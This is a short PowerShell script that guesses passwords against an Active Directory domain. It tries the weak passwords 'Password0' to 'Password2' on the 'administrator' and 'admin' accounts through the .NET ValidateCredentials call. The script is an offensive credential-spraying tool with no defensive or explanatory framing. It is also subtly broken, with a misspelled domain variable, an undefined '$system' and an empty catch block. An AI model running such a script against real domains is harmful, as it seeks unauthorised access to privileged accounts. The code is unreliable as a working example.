date
$username = 'administrator', 'admin'
foreach ($user in $username)
{
   
    $passwords = 'Password0', 'Password1', 'Password2'
    foreach ($password in $passwords) 
	{
	    try
        {
          $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
          [System.Reflection.Assembly]::LoadWithPartialName('System.DirectoryServices.AccountManagement')
          $pc = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext 'Domain', $system.Domain, $CurrnetDomain, ([System.DirectoryServices.AccountManagement.ContextOptions]'SecureSocketLayer,Negotiate')
          $pc.ValidateCredentials($user, $password, [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate)
        }
        catch
        {
         }                 
	 }
}
